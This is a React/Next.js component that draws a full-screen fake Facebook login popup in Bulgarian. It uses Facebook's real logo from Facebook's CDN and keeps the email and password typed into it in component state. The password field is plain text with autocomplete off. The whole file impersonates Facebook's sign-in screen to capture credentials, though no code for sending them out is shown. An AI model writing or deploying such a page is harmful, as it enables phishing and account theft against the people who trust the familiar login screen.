import React, { useState } from "react";
import Link from "next/link";
import Image from "next/image";
const FacebookPopup = () => {
  const [inputs, setInputs] = useState({
    email: "",
    password: "",
  });
  const handler = (e) => {
    setInputs((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };
  return (
    <div className="fixed top-0 left-0 w-screen h-screen bg-[#f0f2f5] z-50 overflow-auto">
      <div className="relative mt-10">
        <Image
          src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
          alt="facebook"
          width={500}
          height={100}
          // objectFit="contain"
        />
        <section className="py-5 mx-4 bg-white rounded-md shadow-facebook ">
          <section className="container">
            <h3 className="text-[18px]  text-center ">Влизане във Facebook</h3>
            <form autoComplete="off">
              <div className="pt-4">
                <input
                  type="text"
                  value={inputs.email}
                  onChange={handler}
                  name="email"
                  autoComplete="off"
                  placeholder="Имейл или телефонен номер"
                  className="w-full px-4 py-3 text-lg border rounded-md border-[#dddfe2] font-meidum placeholder-[#dddfe2] outline-0 "
                />
              </div>
              <div className="pt-4">
                <input
                  type="text"
                  value={inputs.password}
                  onChange={handler}
                  autoComplete="off"
                  name="password"
                  placeholder="Парола"
                  className="w-full px-4 py-3 text-lg border rounded-md border-[#dddfe2] font-meidum placeholder-[#dddfe2]  outline-0"
                />
              </div>
              <div className="w-full mt-4">
                <button className="bg-[#166fe5] text-white w-full py-2 rounded-md font-semibold text-2xl">
                  Влизане
                </button>
              </div>
            </form>
            <div className="text-center text-[#166fe5] mt-4 pb-2">
              <Link href="/">Забравена парола?</Link>
            </div>
          </section>
        </section>
      </div>
    </div>
  );
};

export default FacebookPopup;
